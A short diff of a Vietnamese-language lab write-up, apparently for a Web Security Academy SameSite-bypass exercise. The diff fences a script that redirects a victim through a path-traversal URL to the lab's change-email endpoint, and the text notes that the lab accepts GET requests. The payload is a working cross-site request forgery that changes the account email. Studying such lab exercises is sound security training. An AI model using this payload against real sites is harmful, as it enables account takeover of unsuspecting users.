@@ -36,9 +36,11 @@ Vậy thì giờ ta hãy lợi dụng nó để cho nó cùng site để còn by
 
 ![image](https://github.com/user-attachments/assets/c6e0a992-4f0c-49ac-8e0e-c27e53ee49fa)
 
+```
 <script>
     document.location = "https://0a950078046f5823d8bf2d5900db0094.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=abc@gmail.com%26submit=1";
 </script>
+```
 
 Lí do tại sao tôi không cần phải giả lập post request bằng _method là vì challenge này nó chấp nhận get request v:
 
